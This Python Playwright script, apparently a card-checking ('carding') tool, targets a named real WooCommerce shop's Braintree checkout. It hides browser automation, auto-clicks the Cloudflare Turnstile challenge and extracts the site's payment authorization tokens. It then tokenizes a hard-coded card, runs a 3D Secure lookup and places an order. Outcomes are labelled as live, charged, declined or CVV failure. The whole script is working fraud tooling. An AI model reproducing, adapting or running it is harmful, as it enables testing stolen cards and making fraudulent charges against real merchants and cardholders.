#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VINEX Braintree 3DS Tester — Playwright Edition v2.0
Fixed:
- domcontentloaded بدل networkidle
- Turnstile detection من turnstile API + input
- Xvfb-safe
- إصلاح تعارض الـ f-strings
- دعم headless=True و False
"""
import asyncio, json, re, time, random, uuid, base64, os
from urllib.parse import urlparse
from playwright.async_api import async_playwright


class BraintreeTester:
    def __init__(self, checkout_url, cookies='', headless=False, debug=False):
        self.checkout_url = checkout_url
        p = urlparse(checkout_url)
        self.host = p.netloc
        self.base = f'{p.scheme}://{p.netloc}'
        self.cookies_str = cookies
        self.headless = headless
        self.debug = debug

        self.auth_fp = None
        self.merchant_id = None
        self.woo_nonce = None
        self.bt_config = None
        self.order_total = None
        self.currency = 'GBP'
        self.turnstile_token = None
        self.diagnostics = []
        self._pw = None
        self.browser = None
        self.context = None
        self.page = None

    def _log(self, msg):
        line = f'{time.time():.2f} {msg}'
        self.diagnostics.append(line)
        print(line)

    def _parse_cookies(self):
        out = []
        if not self.cookies_str: return out
        for part in self.cookies_str.split(';'):
            part = part.strip()
            if not part or '=' not in part: continue
            name, _, value = part.partition('=')
            out.append({
                'name': name.strip(),
                'value': value.strip(),
                'domain': self.host,
                'path': '/',
            })
        return out

    # ═══════════════════════════════════════════════════════════
    #  STEP 1: open checkout
    # ═══════════════════════════════════════════════════════════
    async def _open(self):
        self._pw = await async_playwright().start()

        launch_args = [
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--window-size=540,1170',
        ]
        if self.headless:
            launch_args.append('--headless=new')

        self.browser = await self._pw.chromium.launch(
            headless=self.headless,
            args=launch_args,
        )

        self.context = await self.browser.new_context(
            viewport={'width': 540, 'height': 1170},
            user_agent='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            locale='en-GB',
            timezone_id='Europe/London',
            extra_http_headers={
                'Accept-Language': 'en-GB,en;q=0.9',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            },
        )

        await self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', {get: () => ['en-GB','en']});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
            Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
        """)

        cookies = self._parse_cookies()
        if cookies:
            try:
                await self.context.add_cookies(cookies)
                self._log(f'✅ loaded {len(cookies)} cookies')
            except Exception as e:
                self._log(f'cookie load err: {e}')

        self.page = await self.context.new_page()

        self._log(f'📄 opening {self.checkout_url}')
        # ← domcontentloaded بدل networkidle
        await self.page.goto(
            self.checkout_url,
            wait_until='domcontentloaded',
            timeout=60000,
        )
        # انتظر الشبكة تشتغل شوية (بس مش networkidle)
        await self.page.wait_for_timeout(5000)

        # scroll عشان payment form تتحمل
        try:
            await self.page.evaluate('window.scrollBy(0, 800)')
            await self.page.wait_for_timeout(2000)
            await self.page.evaluate('window.scrollTo(0, 0)')
        except: pass

        # extract data
        await self._extract()

    async def _extract(self):
        # 1. client_token
        try:
            data = await self.page.evaluate('''
                () => {
                    if (typeof wc_braintree_client_token !== 'undefined' &&
                        wc_braintree_client_token && wc_braintree_client_token[0]) {
                        return wc_braintree_client_token[0];
                    }
                    const el = document.querySelector('input[name="braintree_cc_config_data"]');
                    if (el && el.value) return '__CONFIG__:' + el.value;
                    return null;
                }
            ''')
        except Exception as e:
            self._log(f'eval err: {e}')
            data = None

        if data:
            try:
                if data.startswith('__CONFIG__:'):
                    cfg = json.loads(data.replace('__CONFIG__:', ''))
                else:
                    decoded = base64.b64decode(
                        data + '=' * (-len(data) % 4)
                    ).decode('utf-8', errors='ignore')
                    cfg = json.loads(decoded)
                self.bt_config = cfg
                self.auth_fp = cfg.get('authorizationFingerprint')
                self.merchant_id = cfg.get('merchantId')
                self._log(f'✅ merchant={self.merchant_id}')
                self._log(f'   auth_fp: {(self.auth_fp or "")[:60]}...')
            except Exception as e:
                self._log(f'decode err: {e}')

        # 2. woo nonce
        try:
            self.woo_nonce = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('input[name="woocommerce-process-checkout-nonce"]');
                    return el ? el.value : null;
                }
            ''')
            self._log(f'✅ woo_nonce: {self.woo_nonce}')
        except: pass

        # 3. order total
        try:
            total = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('.order-total .amount bdi');
                    if (el) return el.textContent.trim();
                    return null;
                }
            ''')
            if total:
                self.order_total = re.sub(r'[^\d.]', '', total)
                self._log(f'✅ order_total: {self.order_total}')
        except: pass

        # 4. Turnstile
        await self._wait_turnstile()

    async def _wait_turnstile(self, timeout=90):
        """انتظر Turnstile — يدعم headless=False (بيتحل تلقائياً) + input + API"""
        self._log('⏳ waiting for Turnstile...')

        for i in range(timeout):
            # 1) من input
            try:
                token = await self.page.evaluate('''
                    () => {
                        const el = document.querySelector('input[name="cf-turnstile-response"]');
                        if (el && el.value && el.value.length > 20) return el.value;
                        return null;
                    }
                ''')
            except: token = None

            # 2) من turnstile API
            if not token:
                try:
                    token = await self.page.evaluate('''
                        () => {
                            if (window.turnstile && typeof turnstile.getResponse === 'function') {
                                const widgets = document.querySelectorAll('.cf-turnstile');
                                for (let w of widgets) {
                                    try {
                                        const r = turnstile.getResponse(w);
                                        if (r && r.length > 20) return r;
                                    } catch(e) {}
                                }
                            }
                            return null;
                        }
                    ''')
                except: token = None

            # 3) لو headless=False، ممكن نحاول نضغط على الشيك بوكس
            if not token and i == 5 and not self.headless:
                try:
                    frames = self.page.frames
                    for f in frames:
                        if 'challenges.cloudflare.com' in f.url:
                            try:
                                await f.click('input[type="checkbox"], body', timeout=2000)
                                self._log('👆 clicked turnstile checkbox')
                            except: pass
                except: pass

            if token and len(token) > 20:
                self.turnstile_token = token
                self._log(f'✅ turnstile: {token[:30]}...')
                return True

            if i % 10 == 0:
                self._log(f'   waiting... ({i}s)')
            await asyncio.sleep(1)

        self._log('⚠️  turnstile not solved')
        return False

    # ═══════════════════════════════════════════════════════════
    #  STEP 2: Charge
    # ═══════════════════════════════════════════════════════════
    async def Charge(self, card):
        parts = card.strip().split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        number = parts[0].replace(' ', '')
        mm = parts[1].zfill(2)
        yy = parts[2]
        if len(yy) == 4: yy = yy[2:]
        cvc = parts[3]

        try:
            await self._open()

            if not self.auth_fp:
                return 'NO_AUTH_FP'
            if not self.woo_nonce:
                return 'NO_WOO_NONCE'
            if not self.turnstile_token:
                self._log('⚠️  continuing without turnstile (may fail)')

            result = await self._charge_in_browser(number, mm, yy, cvc)
            return result

        except Exception as e:
            self._log(f'❌ charge err: {e}')
            import traceback
            if self.debug: traceback.print_exc()
            return f'FATAL: {str(e)[:200]}'
        finally:
            try: await self.browser.close()
            except: pass
            try: await self._pw.stop()
            except: pass

    async def _charge_in_browser(self, number, mm, yy, cvc):
        # ─── 1. tokenize ───
        self._log('🔐 tokenizing...')

        # نجهز البيانات كـ dict ونبعتها كـ arg
        tok_payload = {
            'query': (
                'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {'
                '  tokenizeCreditCard(input: $input) {'
                '    token creditCard { bin brandCode last4 }'
                '  }'
                '}'
            ),
            'variables': {
                'input': {
                    'creditCard': {
                        'number': number,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': 'OX14 4PG',
                            'streetAddress': 'W356',
                        },
                    },
                    'options': {'validate': False},
                }
            },
            'operationName': 'TokenizeCreditCard',
        }

        tok = await self.page.evaluate(
            '''async (args) => {
                const payload = {
                    ...args.payload,
                    clientSdkMetadata: {
                        source: 'client',
                        integration: 'custom',
                        sessionId: crypto.randomUUID(),
                    },
                };
                try {
                    const r = await fetch('https://payments.braintree-api.com/graphql', {
                        method: 'POST',
                        headers: {
                            'Authorization': 'Bearer ' + args.auth_fp,
                            'braintree-version': '2018-05-10',
                            'content-type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });
                    return await r.json();
                } catch(e) {
                    return { error: String(e) };
                }
            }''',
            {'payload': tok_payload, 'auth_fp': self.auth_fp},
        )

        if 'errors' in tok:
            return f'TOKENIZE_ERROR: {json.dumps(tok["errors"])[:200]}'

        nonce = tok.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not nonce:
            return f'NO_NONCE: {json.dumps(tok)[:200]}'
        self._log(f'✅ nonce: {nonce[:40]}...')

        # ─── 2. lookup ───
        self._log('🔍 3DS lookup...')
        bin_num = number[:6]
        amount = self.order_total or '1.00'

        lookup_payload = {
            'amount': amount,
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'en-GB',
            'browserScreenHeight': 1170,
            'browserScreenWidth': 540,
            'browserTimeZone': -60,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'billingLine1': 'W356',
                'billingCity': 'London',
                'billingState': '',
                'billingPostalCode': 'OX14 4PG',
                'billingCountryCode': 'GB',
                'billingPhoneNumber': '447700900123',
                'billingGivenName': 'Test',
                'billingSurname': 'User',
                'email': f'test{random.randint(100,999)}@gmail.com',
            },
            'bin': bin_num,
            'dfReferenceId': f'0_{uuid.uuid4()}',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.144.0',
                'cardinalDeviceDataCollectionTimeElapsed': 12,
                'issuerDeviceDataCollectionTimeElapsed': 3610,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': self.auth_fp,
            'braintreeLibraryVersion': 'braintree/web/3.144.0',
            '_meta': {
                'merchantAppId': self.host,
                'platform': 'web',
                'sdkVersion': '3.144.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
        }

        lk = await self.page.evaluate(
            '''async (args) => {
                const url = 'https://api.braintreegateway.com/merchants/' +
                    args.merchant_id +
                    '/client_api/v1/payment_methods/' +
                    args.nonce +
                    '/three_d_secure/lookup';
                try {
                    const r = await fetch(url, {
                        method: 'POST',
                        headers: { 'content-type': 'application/json' },
                        body: JSON.stringify(args.payload),
                    });
                    return await r.json();
                } catch(e) {
                    return { error: String(e) };
                }
            }''',
            {'merchant_id': self.merchant_id, 'nonce': nonce, 'payload': lookup_payload},
        )

        if 'errors' in lk:
            return f'LOOKUP_ERROR: {json.dumps(lk["errors"])[:200]}'

        info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
        challenge = bool(info.get('challengeRequired'))
        enrolled = info.get('enrolled')
        version = info.get('threeDSecureVersion', '?')
        self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')

        # ─── 3. checkout ───
        self._log('📤 placing order...')
        cfg_json = json.dumps(self.bt_config, separators=(',', ':')) if self.bt_config else '{}'

        checkout_data = {
            'billing_first_name': 'Test',
            'billing_last_name': 'User',
            'billing_company': '',
            'billing_country': 'GB',
            'billing_address_1': 'W356',
            'billing_address_2': 'W456',
            'billing_city': 'London',
            'billing_state': 'W266',
            'billing_postcode': 'OX14 4PG',
            'billing_phone': '447700900123',
            'billing_email': f'test{random.randint(100,999)}@gmail.com',
            'shipping_country': 'GB',
            'shipping_method[0]': 'flexible_shipping_11_5',
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': nonce,
            'braintree_cc_device_data': json.dumps({'correlation_id': str(uuid.uuid4())[:32]}),
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': cfg_json,
            'terms': 'on',
            'terms-field': '1',
            'gdpr_woo_consent': '1',
            'woocommerce-process-checkout-nonce': self.woo_nonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
        }

        co = await self.page.evaluate(
            '''async (args) => {
                const data = new URLSearchParams();
                for (const k in args.data) {
                    data.append(k, args.data[k]);
                }
                const tst = document.querySelector('input[name="cf-turnstile-response"]');
                if (tst && tst.value) data.append('cf-turnstile-response', tst.value);
                try {
                    const r = await fetch('/?wc-ajax=checkout', {
                        method: 'POST',
                        headers: { 'content-type': 'application/x-www-form-urlencoded' },
                        body: data.toString(),
                    });
                    const text = await r.text();
                    return { status: r.status, text: text };
                } catch(e) {
                    return { error: String(e) };
                }
            }''',
            {'data': checkout_data},
        )

        if co.get('error'):
            return f'CHECKOUT_ERROR: {co["error"]}'

        text = co.get('text', '')
        self._log(f'📥 checkout response len={len(text)}')

        try:
            j = json.loads(text)
            result = j.get('result')
            messages = j.get('messages', '')
            clean = re.sub(r'<[^>]+>', '', str(messages))
            clean = re.sub(r'\s+', ' ', clean).strip()

            if result == 'success':
                return f'CHARGED {self.order_total} {self.currency}'

            if result == 'failure':
                low = clean.lower()
                if '3d secure' in low or '3ds' in low:
                    return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'
                if 'verify that you are human' in low:
                    return f'TURNSTILE_FAILED (enrolled={enrolled}) — Card Valid, Turnstile blocked'
                if 'declined' in low: return f'DECLINED: {clean[:180]}'
                if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
                if 'cvv' in low: return 'CVV_FAIL'
                if 'expired' in low: return 'EXPIRED'
                if 'do not honor' in low: return 'DO_NOT_HONOR'
                return f'DECLINED: {clean[:180]}'
        except Exception:
            pass

        if 'order-received' in text:
            return f'CHARGED {self.order_total} {self.currency}'
        return f'UNKNOWN: {text[:200]}'


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════
async def main():
    # ← مهم: على Railway مع Xvfb
    os.environ.setdefault('DISPLAY', ':99')

    COOKIES = (
        'woocommerce_items_in_cart=1; '
        'wp_woocommerce_session_b89dcd3ac6387311302297d2b2714701=t_4ab0dac325c86a42c210bff77f3a84%7C1794653648%7C1794567248%7Cd995540a42879fe0205c2c3ac47b3f1e; '
        'woocommerce_cart_hash=a7e7aa962b94ba5769367c704cffdffa'
    )

    t = BraintreeTester(
        checkout_url='https://shop.herbs-hands-healing.co.uk/checkout',
        cookies=COOKIES,
        headless=False,   # ← مع Xvfb
        debug=True,
    )

    print('=' * 60)
    result = await t.Charge('5523427233579293|12|2027|953')
    print('=' * 60)
    print(f'RESULT: {result}')
    print('=' * 60)

if __name__ == '__main__':
    asyncio.run(main())
